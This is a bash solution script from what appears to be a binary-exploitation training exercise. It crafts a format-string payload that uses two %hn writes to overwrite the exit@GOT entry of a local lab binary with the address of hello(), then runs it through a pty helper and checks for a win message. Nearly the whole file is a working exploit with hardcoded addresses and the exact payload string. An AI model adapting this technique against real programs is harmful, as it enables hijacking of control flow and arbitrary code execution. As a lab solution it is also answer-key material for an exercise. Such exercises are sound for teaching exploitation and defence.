#!/usr/bin/env bash
# ex09 — Format-string GOT overwrite: redirect exit@got to hello()
# printf(buf) then exit(1). We overwrite exit@GOT (0x08049724) with &hello (0x080484b4).
# Split into two %hn writes (slot 4 = buf[0..3], slot 5 = buf[4..7]):
#   high half 0x0804 (2052)  -> 0x08049726
#   low  half 0x84b4 (33972) -> 0x08049724
# A pty helper is required: hello() calls _exit() which skips libc stdio flush.

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"
PTY_HELPER="$(dirname "$SCRIPT_DIR")/solutions/run_pty.py"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }
[[ -f "$PTY_HELPER" ]] || { echo "[!] run_pty.py not found: $PTY_HELPER"; exit 1; }

echo "[*] ex09 — format-string GOT overwrite: exit@got -> hello()"
echo "[*] hello() : $(nm "$BIN" | awk '/ T hello$/{print $1}')"
echo "[*] exit@GOT: $(objdump -R "$BIN" | awk '/exit$/{print $1}' | tail -1)"
echo ""

python3 -c "
import sys, struct
p  = struct.pack('<I', 0x08049726)          # slot 4 -> high half of &hello
p += struct.pack('<I', 0x08049724)          # slot 5 -> low  half of &hello
p += b'%2044x%4\$hn%31920x%5\$hn\n'
sys.stdout.buffer.write(p)
" | python3 "$PTY_HELPER" --stdin "$BIN" | grep -a "code execution\|you win\|\[exit\]\|\[signal\]"

echo ""
echo "[*] done."
